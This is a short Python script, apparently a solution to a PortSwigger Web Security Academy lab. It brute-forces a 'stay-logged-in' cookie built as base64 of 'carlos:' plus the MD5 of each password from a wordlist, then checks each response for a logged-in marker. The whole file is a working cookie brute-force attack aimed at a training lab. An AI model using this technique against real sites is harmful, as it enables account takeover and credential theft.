import requests
import base64
import hashlib
import re

passwords = open("passwords.txt","r")

def calcular_md5(data):
	md5_hash = hashlib.md5()
	md5_hash.update(data.encode("utf-8"))
	hash_result = md5_hash.hexdigest()
	return hash_result

def calcular_base64(data):
	codificado_base64 = base64.b64encode(data.encode('utf-8')).decode('utf-8')
	return codificado_base64
	
for i in passwords:
	hash_md5 = calcular_md5(i.strip())
	data = "carlos:"+hash_md5
	codificado_base64 = calcular_base64(data)
	cookies = {"stay-logged-in":codificado_base64}
	respuesta = requests.get("https://0a890004041fe92d804ffdc3005700f4.web-security-academy.net/my-account?id=carlos", cookies=cookies)
	coincidencia = re.findall("Your username is: carlos",respuesta.text)	
	if coincidencia != []:
		print("El password de carlos es: "+i.strip())
		quit()
